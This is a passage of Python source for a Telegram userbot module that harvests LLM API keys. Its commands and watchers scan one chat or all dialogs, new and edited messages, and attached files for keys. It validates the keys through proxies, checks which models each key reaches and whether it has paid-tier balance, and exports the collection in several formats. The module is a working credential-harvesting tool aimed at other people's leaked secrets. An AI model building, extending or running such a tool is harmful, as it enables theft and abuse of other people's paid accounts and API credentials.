            f"Полный ключ в логах: <b>{{log_full_keys}}</b>"
        ),
        "btn_toggle_safe_checks": "🛡 Безопасные проверки",
        "btn_toggle_log_full_keys": "🔐 Полный ключ в логах",
        "proxy_help": (
            f"{E_LINK} <b>Прокси для проверок:</b> {{proxy}}\n"
            f"{E_GEAR} По одному прокси на строку. Для работы берётся самый живой runtime-прокси автоматически.\n"
            f"{E_LIST} Поддержка: HTTP, SOCKS4/4A/5/5H, VLESS, TROJAN, SHADOWSOCKS, OUTLINE."
        ),
        "proxy_invalid": f"{E_ERR} <b>Прокси не сохранен.</b>\n{{error}}",
        "proxy_disabled": f"{E_LINK} <b>Прокси для проверок выключен.</b>",
        "proxy_set": f"{E_OK} <b>Прокси для проверок сохранен:</b> <code>{{proxy}}</code>",
    })








    @loader.command(
        ru_doc="[chat_id] [fast/simple/deep] [files] [global] [лимит] - Поиск ключей по чату или глобально.",
        en_doc="[chat_id] [fast/simple/deep] [files] [global] [limit] - Scan chat by ID or this chat.",
    )
    async def scanllm(self, message: Message):
        global_mode, limit, scan_mode, include_files, target_chat = self._parse_scan_args(utils.get_args_raw(message), 500)
        await self._run_scan(message, limit=limit, global_mode=global_mode, scan_mode=scan_mode, include_files=include_files, target_chat=target_chat)

    @loader.command(
        ru_doc="[fast/simple/deep] [files] [лимит] - Глобальный поиск ключей по всем диалогам.",
        en_doc="[fast/simple/deep] [files] [limit] - Global key scan across all dialogs.",
    )
    async def scanglobal(self, message: Message):
        _, limit, scan_mode, include_files, _ = self._parse_scan_args(utils.get_args_raw(message), 100)
        await self._run_scan(message, limit=limit, global_mode=True, scan_mode=scan_mode, include_files=include_files)

    @loader.command(
        ru_doc="[global] - Вкл/выкл авто-ловлю. global = во всех чатах",
        en_doc="[global] - Toggle auto-scan. global = all chats",
    )
    async def autokeys(self, message: Message):
        args = (utils.get_args_raw(message) or "").strip().lower()
        global_mode = args in {"global", "all", "-g", "--global"}
        target = GLOBAL_AUTOCATCH if global_mode else message.chat_id
        enabled_key = "auto_on_global" if global_mode else "auto_on"
        disabled_key = "auto_off_global" if global_mode else "auto_off"

        if self._toggle_autocatch_target(target):
            await self._answer(message, self.strings[enabled_key])
            if self._settings.get("log_mode") == "heroku":
                try:
                    await self._bootstrap_heroku_logs()
                except Exception:
                    pass
        else:
            await self._answer(message, self.strings[disabled_key])

    @loader.command(
        ru_doc="Переключить режим логирования",
        en_doc="Cycle log mode",
    )
    async def kslog(self, message: Message):
        modes   = ["none", "saved", "heroku", "custom"]
        cur     = self._settings.get("log_mode", "none")
        if cur not in modes:
            cur = "none"
        nxt     = modes[(modes.index(cur) + 1) % len(modes)]
        self._settings["log_mode"] = nxt
        self._save()
        if nxt == "heroku":
            try:
                await self._bootstrap_heroku_logs()
            except Exception:
                pass
        await self._answer(message, f"{E_BELL} <b>Logging →</b> <b>{nxt.upper()}</b>")

    @loader.command(
        ru_doc="[proxy|off] - HTTP/SOCKS/VLESS/TROJAN/SS/OUTLINE прокси для проверки ключей",
        en_doc="[proxy|off] - HTTP/SOCKS/VLESS/TROJAN/SS/OUTLINE proxy for key validation",
    )
    async def ksproxy(self, message: Message):
        args = utils.get_args_raw(message).strip()
        if not args:
            if self._load_proxy_specs():
                await self._refresh_proxy_health(force=False)
            text = self.strings["proxy_help"].format(proxy=self._masked_check_proxy_text())
            text += "\n\n" + self._proxy_help_examples()
            text += self._proxy_pool_status_block()
            return await self._answer(message, text)
        proxy, error = self._normalize_proxy_pool(args)
        if error:
            return await self._answer(message, self.strings["proxy_invalid"].format(error=html.escape(error)))
        if not proxy:
            self._settings["check_proxy"] = ""
            self._proxy_health = {}
            self._save()
            return await self._answer(message, self.strings["proxy_disabled"])
        self._settings["check_proxy"] = proxy
        await self._refresh_proxy_health(force=True)
        self._save()
        text = self.strings["proxy_set"].format(proxy=html.escape(self._mask_proxy_for_display(proxy.replace("\n", " | "))))
        text += self._proxy_pool_status_block()
        return await self._answer(message, text)

    @loader.command(
        ru_doc="Удалить все невалидные ключи",
        en_doc="Remove all invalid keys",
    )
    async def ksclean(self, message: Message):
        msg   = await self._answer(message, self.strings["checking_all"].format(done=0, total=len(self._keys)))
        keys  = list(self._keys.keys())
        inv   = 0
        async with self._http_session() as session:
            results = await self._gather_chunked([self._validate_key(session, k) for k in keys])
            for k, (prov, ok) in zip(keys, results):
                if not ok:
                    inv += 1
                    self._purge_key(k)
        self._save()
        await self._answer(msg, f"{E_OK} <b>Cleaned!</b> Removed: <b>{inv}</b>")

    @loader.command(
        ru_doc="<реплай/ссылка/текст> - Импорт ключей",
        en_doc="<reply/link/text> - Import keys",
    )
    async def ksimport(self, message: Message):
        msg       = await self._answer(message, self.strings["importing"])
        text_data = ""
        reply     = await message.get_reply_message()
        args      = utils.get_args_raw(message)

        if reply and reply.file:
            try:
                raw       = await self.client.download_media(reply, bytes)
                text_data = raw.decode("utf-8", errors="ignore")
            except Exception:
                pass
        elif reply and reply.raw_text:
            text_data = reply.raw_text
        elif args.startswith("http"):
            try:
                async with self._http_session() as s:
                    async with s.get(args, timeout=10) as r:
                        text_data = await r.text()
            except Exception:
                pass
        elif args:
            text_data = args

        if not text_data:
            return await self._answer(msg, self.strings["import_err"])

        unique  = set(self.key_regex.findall(text_data))
        count   = 0
        reply_mid = getattr(reply, "id", None) if reply else None
        reply_mid = reply_mid or None
        reply_un = self._peer_username_for_link(reply) if reply else None
        reply_link_cid = getattr(reply, "chat_id", None) if reply else None
        async with self._http_session() as session:
            results = await self._gather_chunked([self._validate_key(session, k) for k in unique])
            for key, (prov, ok) in zip(unique, results):
                if ok and key not in self._keys:
                    count += 1
                    await self._register_key(
                        session,
                        key,
                        prov,
                        "Import",
                        via="import",
                        source_message_id=reply_mid,
                        source_chat_username=reply_un,
                        message_link_chat_id=reply_link_cid,
                    )
        if count:
            self._save()
        await self._answer(msg, self.strings["imported"].format(count=count))

    @loader.command(
        ru_doc="Меню ключей",
        en_doc="Keys menu",
    )
    async def mykeys(self, message: Message):
        if not self._keys:
            return await self._answer(message, self.strings["empty"])

        # ── instant loading indicator ─────────────────────────────────────────
        # Edit the user's own outgoing message to a localised loading string
        # BEFORE the inline form is created. This is the fastest possible UX:
        # the message changes on the client side with zero perceived latency.
        try:
            await utils.answer(message, self._loading_text())
        except Exception:
            pass
        # ─────────────────────────────────────────────────────────────────────

        form = await self.inline.form(
            text=self._ui_text(self.strings["loading"]),
            message=message,
            reply_markup=self._ui_markup([[self._btn(EMPTY_LOADING_BUTTON_TEXT, self._empty_loading_button)]]),
        )
        await asyncio.sleep(0.35)

        await self._edit(form, text=self._db_stats_text(), reply_markup=self._get_main_markup(), preview_banner=self._preview_banner())

    @loader.watcher(only_messages=True)
    async def watcher(self, message: Message):
        """Catch keys in new messages AND attached text files."""
        cid = getattr(message, "chat_id", None)
        if not self._is_autocatch_enabled_for(cid):
            return

        text = self._message_text_for_scan(message)
        message_id = getattr(message, "id", 0)
        scan_mid = message_id or None
        peer_username = self._peer_username_for_link(message)
        if text and self._text_might_contain_key(text) and not self._should_skip_scan(cid, message_id, text, "message"):
            asyncio.create_task(
                self._process_text(text, cid, via="message", message_id=scan_mid, chat_username=peer_username)
            )

        if self._settings.get("file_scan", True) and self._is_text_file_message(message):
            async def _scan_file(msg=message):
                try:
                    raw = await self.client.download_media(msg, bytes)
                    if raw:
                        text_data = raw.decode("utf-8", errors="ignore")
                        if self._text_might_contain_key(text_data) and not self._should_skip_scan(cid, message_id, text_data[:4096], "file"):
                            await self._process_text(
                                text_data, cid, via="file", message_id=scan_mid, chat_username=peer_username
                            )
                except Exception:
                    pass
            asyncio.create_task(_scan_file())

    @loader.watcher()
    async def edit_watcher(self, message: Message):
        """Catch keys in edited messages with 150 ms debounce — near-instant, zero flood."""
        if not self._settings.get("edit_scan", True):
            return
        cid = getattr(message, "chat_id", None)
        if not self._is_autocatch_enabled_for(cid):
            return
        if not getattr(message, "edit_date", None):
            return
        text = getattr(message, "raw_text", None) or ""
        if not text or not self._text_might_contain_key(text):
            return

        slot = f"{cid}:{getattr(message, 'id', 0)}"
        old  = self._edit_tasks.get(slot)
        if old and not old.done():
            old.cancel()

        scan_mid = getattr(message, "id", None) or None
        peer_username = self._peer_username_for_link(message)

        async def _debounced(t=text, c=cid, s=slot, mid=scan_mid, un=peer_username):
            await asyncio.sleep(0.15)
            if not self._should_skip_scan(c, getattr(message, "id", 0), t, "edit"):
                await self._process_text(t, c, via="edit", message_id=mid, chat_username=un)
            self._edit_tasks.pop(s, None)

        self._edit_tasks[slot] = asyncio.create_task(_debounced())

    async def ks_list(self, call, page, filter_mode="all", sort_mode=None):
        sort_mode = self._normalize_sort_mode(sort_mode)
        all_keys = sorted(self._keys.keys())
        index_map = {key: idx for idx, key in enumerate(all_keys)}
        keys_list = list(self._filtered_keys(filter_mode).keys())
        if filter_mode not in {"all", "paid", "free"} and not self._provider_filter_value(filter_mode):
            filter_mode = "all"
            keys_list = all_keys
        keys_list = self._sort_keys_for_view(keys_list, sort_mode)

        per_page    = self._page_size()
        total_pages = max(1, (len(keys_list) + per_page - 1) // per_page)
        page        = max(0, min(page, total_pages - 1))
        start       = page * per_page
        cur_keys    = keys_list[start:start + per_page]
        provider_filter = self._provider_filter_value(filter_mode)
        provider_btn = self.strings["btn_filter_provider"]
        if provider_filter:
            provider_btn = f"{provider_btn}: {provider_filter}"

        markup = [[
            self._btn(("✅ " if filter_mode == "all"  else "") + self.strings["btn_filter_all"],  self.ks_list, (0, "all", sort_mode), "primary" if filter_mode == "all" else None),
            self._btn(("✅ " if filter_mode == "paid" else "") + self.strings["btn_filter_paid"], self.ks_list, (0, "paid", sort_mode), "success" if filter_mode == "paid" else None),
            self._btn(("✅ " if filter_mode == "free" else "") + self.strings["btn_filter_free"], self.ks_list, (0, "free", sort_mode), "danger" if filter_mode == "free" else None),
        ], [
            self._btn(provider_btn, self.ks_provider_menu, (page, filter_mode, sort_mode), "success" if provider_filter else None),
            self._btn(f"{self.strings['btn_sort_menu']}: {self.strings[f'sort_label_{sort_mode}']}", self.ks_sort_menu, (page, filter_mode, sort_mode), "primary"),
        ]]
        if provider_filter:
            markup.append([self._btn(self.strings["btn_filter_reset"], self.ks_list, (0, "all", sort_mode), "danger")])
        for k in cur_keys:
            idx     = index_map[k]
            markup.append([{"text": self._list_row_text(k), "callback": self.ks_key_menu, "args": (idx, self._settings.get("auto_hide_keys", True), page, filter_mode, sort_mode)}])
        if total_pages > 1:
            markup.append([
                self._btn("◀️", self.ks_list, (page - 1, filter_mode, sort_mode), "primary"),
                self._btn(f"{page + 1}/{total_pages}", self.ks_list, (page, filter_mode, sort_mode), "success"),
                self._btn("▶️", self.ks_list, (page + 1, filter_mode, sort_mode), "primary"),
            ])
        markup.append([self._btn(self.strings["btn_back"], self.ks_back, style="primary")])
        await self._edit(
            call,
            text=self.strings["list_title"].format(
                page=page + 1,
                total_pages=total_pages,
                sort_label=self.strings[f"sort_label_{sort_mode}"],
                filter_label=self._filter_label(filter_mode),
                shown_count=len(cur_keys),
            ),
            reply_markup=markup,
            preview_banner=self._preview_banner()
        )

    async def ks_sort_menu(self, call, page=0, filter_mode="all", sort_mode=None):
        sort_mode = self._normalize_sort_mode(sort_mode)
        markup = [
            [
                self._btn(("✅ " if sort_mode == "recent" else "") + self.strings["btn_sort_recent"], self.ks_list, (0, filter_mode, "recent"), "primary" if sort_mode == "recent" else None),
                self._btn(("✅ " if sort_mode == "alpha" else "") + self.strings["btn_sort_alpha"], self.ks_list, (0, filter_mode, "alpha"), "primary" if sort_mode == "alpha" else None),
            ],
            [
                self._btn(("✅ " if sort_mode == "provider" else "") + self.strings["btn_sort_provider"], self.ks_list, (0, filter_mode, "provider"), "success" if sort_mode == "provider" else None),
                self._btn(("✅ " if sort_mode == "tier" else "") + self.strings["btn_sort_tier"], self.ks_list, (0, filter_mode, "tier"), "danger" if sort_mode == "tier" else None),
            ],
            [
                self._btn(("✅ " if sort_mode == "balance" else "") + self.strings["btn_sort_balance"], self.ks_list, (0, filter_mode, "balance"), "success" if sort_mode == "balance" else None),
            ],
            [self._btn(self.strings["btn_back"], self.ks_list, (page, filter_mode, sort_mode), "primary")],
        ]
        await self._edit(call, text=self.strings["sort_menu_title"], reply_markup=markup,
            preview_banner=self._preview_banner()
        )

    async def ks_provider_menu(self, call, page=0, filter_mode="all", sort_mode=None):
        sort_mode = self._normalize_sort_mode(sort_mode)
        providers = self._provider_summary()
        per_page = 8
        total_pages = max(1, (len(providers) + per_page - 1) // per_page)
        page = max(0, min(page, total_pages - 1))
        chunk = providers[page * per_page:(page + 1) * per_page]
        active_provider = self._provider_filter_value(filter_mode)
        markup = []
        for provider, stats in chunk:
            prefix = "✅ " if provider == active_provider else ""
            label = f"{prefix}{provider} · {stats['total']}"
            markup.append([self._btn(label, self.ks_list, (0, f'provider:{provider}', sort_mode), "success" if provider == active_provider else None)])
        markup.append([self._btn(self.strings["btn_filter_all"], self.ks_list, (0, "all", sort_mode), "primary")])
        if total_pages > 1:
            markup.append([
                self._btn("◀️", self.ks_provider_menu, (page - 1, filter_mode, sort_mode), "primary"),
                self._btn(f"{page + 1}/{total_pages}", self.ks_provider_menu, (page, filter_mode, sort_mode), "success"),
                self._btn("▶️", self.ks_provider_menu, (page + 1, filter_mode, sort_mode), "primary"),
            ])
        markup.append([self._btn(self.strings["btn_back"], self.ks_list, (page, filter_mode, sort_mode), "primary")])
        await self._edit(call, text=self.strings["provider_menu_title"], reply_markup=markup,
            preview_banner=self._preview_banner()
        )

    async def ks_key_menu(self, call, idx, hidden=True, page=0, filter_mode="all", sort_mode="recent"):
        all_keys = sorted(self._keys.keys())
        if idx >= len(all_keys):
            return
        k    = all_keys[idx]
        prov = self._keys[k]
        tier = {
            "paid": self.strings["tier_paid_label"],
            "free": self.strings["tier_free_label"],
        }.get(self._paid_status.get(k, ""), self.strings["tier_unknown"])
        models = self._ensure_model_cache().get(k, [])
        display = self._mask_key(k, hidden)
        models_count = len(models)
        quota = self._key_meta.get(k, {}).get("quota") if isinstance(self._key_meta, dict) else None
        markup = [
            [self._btn(self.strings["btn_show_key"] if hidden else self.strings["btn_hide_key"],
                       self.ks_key_menu, (idx, not hidden, page, filter_mode, sort_mode), "primary")],
            [self._btn(self.strings["btn_models_single"].format(count=models_count),
                       self.ks_models_menu, (idx, hidden, page, filter_mode, sort_mode, 0), "primary")],
            [
                self._btn(self.strings["btn_check_single"], self.ks_val_single, (idx, page, filter_mode, sort_mode), "success"),
                self._btn(self.strings["btn_del_single"], self.ks_del_single, (idx, page, filter_mode, sort_mode), "danger"),
            ],
        ]
        if self._provider_supports_quota(prov, quota):
            markup.append([self._btn(self.strings["btn_refresh_balance"], self.ks_refresh_balance, (idx, hidden, page, filter_mode, sort_mode), "success")])
        markup.append([self._btn(self.strings["btn_back"], self.ks_list, (page, filter_mode, sort_mode), "primary")])
        await self._edit(
            call,
            text=self.strings["key_info"].format(
                provider=html.escape(str(prov)),
                tier=tier,
                key=html.escape(display),
                models_count=models_count,
                quota=self._format_quota(quota),
            ),
            reply_markup=markup,
            preview_banner=self._preview_banner(prov)
        )

    async def ks_models_menu(self, call, idx, hidden=True, page=0, filter_mode="all", sort_mode="recent", model_page=0):
        all_keys = sorted(self._keys.keys())
        if idx >= len(all_keys):
            return
        k = all_keys[idx]
        prov = self._keys.get(k, "Unknown")
        models = self._ensure_model_cache().get(k, [])
        page_models, model_page, total_pages, total_models = self._paginate_models(models, model_page, self._models_page_size())
        models_text = self._models_list_text(page_models, prov, limit=self._models_page_size())
        page_header = (
            f"{E_LIST} <b>Page:</b> {model_page + 1}/{total_pages}\n"
            f"{E_RIGHT} <b>Shown:</b> {len(page_models)}/{total_models}"
        )
        markup = [[self._btn(self.strings["btn_back"], self.ks_key_menu, (idx, hidden, page, filter_mode, sort_mode), "primary")]]
        if total_pages > 1:
            markup.insert(0, [
                self._btn("⏮", self.ks_models_menu, (idx, hidden, page, filter_mode, sort_mode, 0), "primary"),
                self._btn("◀️", self.ks_models_menu, (idx, hidden, page, filter_mode, sort_mode, max(0, model_page - 1)), "primary"),
                self._btn(f"{model_page + 1}/{total_pages}", self.ks_models_menu, (idx, hidden, page, filter_mode, sort_mode, model_page), "success"),
                self._btn("▶️", self.ks_models_menu, (idx, hidden, page, filter_mode, sort_mode, min(total_pages - 1, model_page + 1)), "primary"),
                self._btn("⏭", self.ks_models_menu, (idx, hidden, page, filter_mode, sort_mode, total_pages - 1), "primary"),
            ])
        await self._edit(
            call,
            text=self.strings["key_models_title"].format(
                provider=html.escape(str(prov)),
                count=total_models,
                models=f"{page_header}\n\n{models_text}",
            ),
            reply_markup=markup,
            preview_banner=self._preview_banner(prov)
        )

    async def ks_refresh_balance(self, call, idx, hidden=True, page=0, filter_mode="all", sort_mode="recent"):
        all_keys = sorted(self._keys.keys())
        if idx >= len(all_keys):
            return
        k = all_keys[idx]
        prov = self._keys.get(k, "Unknown")
        if not self._provider_supports_quota(prov, self._key_meta.get(k, {}).get("quota")):
            return await self.ks_key_menu(call, idx, hidden, page, filter_mode, sort_mode)
        await self._edit(call, text=self.strings["quota_refreshing"])
        async with self._http_session() as session:
            try:
                prov, ok = await self._validate_key(session, k)
                self._keys[k] = prov
                meta = self._key_meta.setdefault(k, {})
                meta["valid"] = ok
                meta["validated_at"] = self._now_ts()
                if not ok:
                    self._paid_status[k] = "unknown"
                    meta["quota"] = {"kind": "error", "provider": prov, "checked_at": self._now_ts(), "message": "real request failed"}
                    self._save()
                    return await self.ks_key_menu(call, idx, hidden, page, filter_mode, sort_mode)
                models = await self._discover_models(session, k, prov)
                if models:
                    models = self._sort_models(prov, models)
                    self._ensure_model_cache()[k] = models
                else:
                    self._ensure_model_cache().pop(k, None)
                tier = await self._check_paid(session, k, prov, models=self._ensure_model_cache().get(k, []))
                if not tier or tier == "unknown":
                    tier = self._tier_from_models(prov, self._ensure_model_cache().get(k, [])) or "unknown"
                self._paid_status[k] = self._normalize_tier(tier)
                quota = await self._fetch_key_quota(session, k, prov)
                meta["quota"] = quota
                meta["provider"] = prov
                meta["tier"] = self._normalize_tier(tier)
                meta["models_count"] = len(self._ensure_model_cache().get(k, []))
            except Exception:
                self._key_meta.setdefault(k, {})["quota"] = {"kind": "error", "checked_at": self._now_ts()}
        self._save()
        await self.ks_key_menu(call, idx, hidden, page, filter_mode, sort_mode)

    async def ks_val_single(self, call, idx, page=0, filter_mode="all", sort_mode="recent"):
        all_keys = sorted(self._keys.keys())
        if idx >= len(all_keys):
            return
        k = all_keys[idx]
        async with self._http_session() as session:
            prov, ok = await self._validate_key(session, k)
            if prov != "Unknown":
                self._keys[k] = prov
            meta = self._key_meta.setdefault(k, {})
            meta["valid"] = ok
            meta["validated_at"] = self._now_ts()
            if ok:
                models = await self._discover_models(session, k, prov)
                if models:
                    self._ensure_model_cache()[k] = self._sort_models(prov, models)
                tier = await self._check_paid(session, k, prov, models=self._ensure_model_cache().get(k, []))
                if tier in (None, "unknown"):
                    tier = self._tier_from_models(prov, self._ensure_model_cache().get(k, [])) or "unknown"
                self._paid_status[k] = self._normalize_tier(tier)
                self._record_key_meta(k, prov, models=self._ensure_model_cache().get(k, []), tier=tier)
                self._key_meta.setdefault(k, {})["quota"] = await self._fetch_key_quota(session, k, prov)
            else:
                self._paid_status[k] = "unknown"
                meta["quota"] = {"kind": "error", "provider": prov, "checked_at": self._now_ts(), "message": "real request failed"}
        self._save()
        status = self.strings["status_valid"] if ok else self.strings["status_invalid"]
        await self._edit(
            call,
            text=self.strings["check_res_single"].format(provider=prov, status=status),
            reply_markup=[[{"text": self.strings["btn_back"], "callback": self.ks_key_menu, "args": (idx, True, page, filter_mode, sort_mode)}]],
            preview_banner=self._preview_banner()
        )

    async def ks_del_single(self, call, idx, page=0, filter_mode="all", sort_mode="recent"):
        all_keys = sorted(self._keys.keys())
        if idx < len(all_keys):
            k = all_keys[idx]
            self._purge_key(k)
            self._save()
        await self._edit(
            call,
            text=self.strings["deleted"],
            reply_markup=[[{"text": self.strings["btn_back"], "callback": self.ks_list, "args": (page, filter_mode, sort_mode)}]],
            preview_banner=self._preview_banner()
        )

    async def ks_val_all(self, call):
        keys = sorted(self._keys.keys())
        total = len(keys)
        await self._edit(call, text=self.strings["checking_all"].format(done=0, total=total))
        valid_c = invalid_c = 0
        prov_stats = {}
        self._invalid_keys_cache.clear()
        async with self._http_session() as session:
            tasks = [asyncio.create_task(self._validate_key_bundle(session, key)) for key in keys]
            done = 0
            progress_step = max(1, min(5, total // 10 or 1))
            for task in asyncio.as_completed(tasks):
                bundle = await task
                provider = bundle["provider"]
                ok = self._apply_validated_key_bundle(bundle)
                prov_stats.setdefault(provider, {"total": 0, "valid": 0})
                prov_stats[provider]["total"] += 1
                if ok:
                    valid_c += 1
                    prov_stats[provider]["valid"] += 1
                else:
                    invalid_c += 1
                    self._invalid_keys_cache.append(bundle["key"])
                done += 1
                if done == total or done % progress_step == 0:
                    try:
                        await self._edit(call, text=self.strings["checking_all"].format(done=done, total=total))
                    except Exception:
                        pass
        self._save()
        stats_str = "".join(
            f"<b>[{p}]:</b> {s['total']} | {s['valid']} valid\n"
            for p, s in prov_stats.items()
        )
        markup = []
        if invalid_c > 0:
            markup.append([{"text": self.strings["btn_clr_inv"], "callback": self.ks_clr_inv}])
        markup.append([self._btn(self.strings["btn_back"], self.ks_back, style="primary")])
        await self._edit(
            call,
            text=self.strings["check_res_all"].format(
                total=total, v=valid_c, i=invalid_c, prov_stats=stats_str,
            ),
            reply_markup=markup,
            preview_banner=self._preview_banner()
        )

    async def ks_clr_inv(self, call):
        for k in self._invalid_keys_cache:
            self._purge_key(k)
        self._save()
        self._invalid_keys_cache.clear()
        await self._edit(
            call,
            text=self.strings["deleted"],
            reply_markup=[[{"text": self.strings["btn_back"], "callback": self.ks_back}]],
            preview_banner=self._preview_banner()
        )

    def _stats_balance_block(self) -> str:
        provider_balances = {}
        for key, provider in self._keys.items():
            meta = self._key_meta.get(key, {})
            quota = meta.get("quota") if isinstance(meta, dict) else None
            if not isinstance(quota, dict) or quota.get("kind") != "usage":
                continue
            try:
                val = float(str(quota.get("usage", "0")).replace("—", "0"))
            except (ValueError, TypeError):
                continue
            if val <= 0:
                continue
            provider_balances[provider] = provider_balances.get(provider, 0) + val
        if not provider_balances:
            return ""
        lines = [self.strings["stats_balance_header"]]
        for provider, total in sorted(provider_balances.items(), key=lambda x: -x[1]):
            lines.append(self.strings["stats_balance_line"].format(
                provider=provider,
                balance=f"{total:.2f}",
            ))
        return "\n".join(lines)

    async def ks_stats(self, call):
        summary = self._provider_stats_map()
        total = len(self._keys)
        providers = len(summary)
        paid = sum(item["paid"] for item in summary.values())
        free = sum(item["free"] for item in summary.values())
        unknown = sum(item["unknown"] for item in summary.values())
        models_cache = self._ensure_model_cache()
        keys_with_models = sum(1 for key in self._keys if models_cache.get(key))
        unique_models = len({model for models in models_cache.values() for model in models})
        classified = paid + free
        now = self._now_ts()
        recent_24h = sum(1 for meta in self._key_meta.values() if (meta.get("first_seen") or 0) >= now - 86400)
        avg_models = (sum(len(models) for models in models_cache.values()) / keys_with_models) if keys_with_models else 0

        lines = []
        for provider, stats in self._provider_summary():
            provider_models = len({model for key, prov in self._keys.items() if prov == provider for model in models_cache.get(key, [])})
            share = (stats["total"] / total * 100) if total else 0
            lines.append(
                self.strings["stats_provider_line"].format(
                    provider=provider,
                    count=stats["total"],
                    share=f"{share:.0f}",
                    paid=stats["paid"],
                    free=stats["free"],
                    unknown=stats["unknown"],
                    provider_models=provider_models,
                )
            )
        header = self.strings["stats_adv_header"].format(
            total=total,
            providers=providers,
            recent_24h=recent_24h,
            paid=paid,
            free=free,
            unknown=unknown,
            keys_with_models=keys_with_models,
            unique_models=unique_models,
            avg_models=f"{avg_models:.1f}",
            classified=classified,
        )

        await self._edit(
            call,
            text=header + ("\n".join(lines) or "—") + self._stats_balance_block(),
            reply_markup=[[{"text": self.strings["btn_back"], "callback": self.ks_back, "style": "primary"}]],
            preview_banner=self._preview_banner()
        )

    async def ks_exp_menu(self, call, tier_raw="", provider_raw="", page=0):
        provider_stats = self._provider_summary()
        total_pages = max(1, (len(provider_stats) + 8 - 1) // 8)
        page = max(0, min(page, total_pages - 1))
        chunk = provider_stats[page * 8:(page + 1) * 8]
        selected_tiers = self._parse_export_tokens(tier_raw)
        selected_providers = self._parse_export_tokens(provider_raw)
        matched = self._export_candidates(tier_raw, provider_raw)

        tier_labels = {
            "paid": self.strings["btn_filter_paid"],
            "free": self.strings["btn_filter_free"],
            "unknown": self.strings["tier_unknown"],
        }
        markup = [[
            self._btn(("✅ " if "paid" in selected_tiers else "") + tier_labels["paid"], self.ks_exp_toggle_tier, ("paid", tier_raw, provider_raw, page), "success" if "paid" in selected_tiers else None),
            self._btn(("✅ " if "free" in selected_tiers else "") + tier_labels["free"], self.ks_exp_toggle_tier, ("free", tier_raw, provider_raw, page), "danger" if "free" in selected_tiers else None),
            self._btn(("✅ " if "unknown" in selected_tiers else "") + tier_labels["unknown"], self.ks_exp_toggle_tier, ("unknown", tier_raw, provider_raw, page), "primary" if "unknown" in selected_tiers else None),
        ]]

        for provider, stats in chunk:
            active = provider in selected_providers
            label = f"{'✅ ' if active else ''}{provider} · {stats['total']}"
            markup.append([self._btn(label, self.ks_exp_toggle_provider, (provider, tier_raw, provider_raw, page), "success" if active else None)])

        utility_row = [
            self._btn(self.strings["btn_reset_scope"], self.ks_exp_menu, ("", "", 0), "danger"),
            self._btn(self.strings["btn_scope_next_format"], self.ks_exp_formats, (tier_raw, provider_raw), "primary"),
        ]
        markup.append(utility_row)
        if total_pages > 1:
            markup.append([
                self._btn("◀️", self.ks_exp_menu, (tier_raw, provider_raw, page - 1), "primary"),
                self._btn(f"{page + 1}/{total_pages}", self.ks_exp_menu, (tier_raw, provider_raw, page), "success"),
                self._btn("▶️", self.ks_exp_menu, (tier_raw, provider_raw, page + 1), "primary"),
            ])
        markup.append([self._btn(self.strings["btn_back"], self.ks_back, style="primary")])
        scope = self._export_scope_label(tier_raw, provider_raw)
        await self._edit(
            call,
            text=(
                f"{E_DOWN} <b>{self.strings['export_scope_title']}</b>\n"
                f"{E_LIST} <b>{scope}</b>\n"
                f"{E_BOX} {self.strings['export_matching_label']}: <b>{len(matched)}</b>\n"
                f"{self.strings['export_scope_hint']}"
            ),
            reply_markup=markup,
            preview_banner=self._preview_banner()
        )

    async def ks_exp_toggle_tier(self, call, tier, tier_raw="", provider_raw="", page=0):
        await self.ks_exp_menu(call, self._toggle_export_token(tier_raw, tier), provider_raw, page)

    async def ks_exp_toggle_provider(self, call, provider, tier_raw="", provider_raw="", page=0):
        await self.ks_exp_menu(call, tier_raw, self._toggle_export_token(provider_raw, provider), page)

    async def ks_exp_formats(self, call, tier_raw="", provider_raw=""):
        data = self._export_candidates(tier_raw, provider_raw)
        if not data:
            return await self._edit(call, text=self.strings["export_empty_filter"], reply_markup=[[self._btn(self.strings["btn_back"], self.ks_exp_menu, (tier_raw, provider_raw, 0), "primary")]])

        markup = [
            [
                self._btn("JSON map", self.ks_exp_send, ("json_map", tier_raw, provider_raw), "primary"),
                self._btn("JSON records", self.ks_exp_send, ("json_records", tier_raw, provider_raw), "primary"),
            ],
            [
                self._btn("JSONL", self.ks_exp_send, ("jsonl", tier_raw, provider_raw), "success"),
                self._btn("CSV", self.ks_exp_send, ("csv", tier_raw, provider_raw), "success"),
            ],
            [
                self._btn("TXT raw", self.ks_exp_send, ("txt_keys", tier_raw, provider_raw), "danger"),
                self._btn("TXT full", self.ks_exp_send, ("txt_full", tier_raw, provider_raw), "danger"),
            ],
            [self._btn("ENV", self.ks_exp_send, ("env", tier_raw, provider_raw), "primary")],
            [self._btn(self.strings["btn_back"], self.ks_exp_menu, (tier_raw, provider_raw, 0), "primary")],
        ]
        await self._edit(
            call,
            text=(
                f"{E_DOWN} <b>{self.strings['export_format_title']}</b>\n"
                f"{E_LIST} <b>{self._export_scope_label(tier_raw, provider_raw)}</b>\n"
                f"{E_BOX} {self.strings['export_key_count_label']}: <b>{len(data)}</b>"
            ),
            reply_markup=markup,
            preview_banner=self._preview_banner()
        )

    async def ks_exp_send(self, call, fmt, tier_raw="", provider_raw=""):
        data = self._export_candidates(tier_raw, provider_raw)
        if not data:
            return await self._edit(call, text=self.strings["export_empty_filter"], reply_markup=[[self._btn(self.strings["btn_back"], self.ks_exp_menu, (tier_raw, provider_raw, 0), "primary")]])
        payload, filename, label = self._export_payload(data, fmt, tier_raw, provider_raw)
        fd = io.BytesIO(payload)
        fd.name = filename
        await self.client.send_file(
            "me",
            file=fd,
            caption=self._ui_text(self.strings["export_caption"].format(
                label=label,
                scope=self._export_scope_label(tier_raw, provider_raw),
                count=len(data),
            )),
            parse_mode="html",
        )
        await self._edit(
            call,
            text=self.strings["exported"],
            reply_markup=[[{"text": self.strings["btn_back"], "callback": self.ks_back}]],
            preview_banner=self._preview_banner()
        )

    async def ks_exp_txt(self, call, filter_mode="all"):
        data  = self._filtered_keys(filter_mode)
        label = {
            "all": self.strings["export_legacy_label_all"],
            "paid": self.strings["export_legacy_label_paid"],
            "free": self.strings["export_legacy_label_free"],
        }.get(filter_mode, self.strings["export_legacy_label_all"])
        fd    = io.BytesIO("\n".join(f"{k} | {p}" for k, p in data.items()).encode("utf-8"))
        suffix = {
            "paid": "_paid",
            "free": "_free",
        }.get(filter_mode, "")
        fd.name = f"keys{suffix}.txt"
        await self.client.send_file(
            "me", file=fd,
            caption=self._ui_text(f"{E_COPY} <b>{label}</b> ({len(data)} {self.strings['export_key_count_label'].lower()})"),
            parse_mode="html",
        )
        await self._edit(call, text=self.strings["exported"],
